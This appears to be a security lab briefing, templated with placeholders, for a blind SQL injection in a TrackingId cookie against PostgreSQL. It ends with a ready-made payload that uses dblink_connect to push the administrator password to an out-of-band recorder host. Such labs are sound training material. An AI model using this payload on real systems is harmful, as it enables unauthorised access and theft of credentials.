Lab briefing: the site looks up the TrackingId cookie against a tracked_users table. The result is never reflected, any SQL error is swallowed, and there is no timing gate - the response body is identical regardless of what the payload does. There is no in-band channel at all.

The backend is PostgreSQL with the dblink extension enabled, and an out-of-band recorder is running on {{ oob_hostname }}:5432 on the compose network. That recorder parses the Postgres wire-protocol startup message of every inbound connection, so any value embedded in a libpq connection parameter shows up verbatim below.

Exfiltrate the administrator password into a connection-string parameter in one shot, e.g.
TrackingId=x'||(SELECT dblink_connect('host={{ oob_hostname }} port=5432 sslmode=disable user='||(SELECT password FROM users WHERE username='administrator')||' password=x dbname=x'))||'
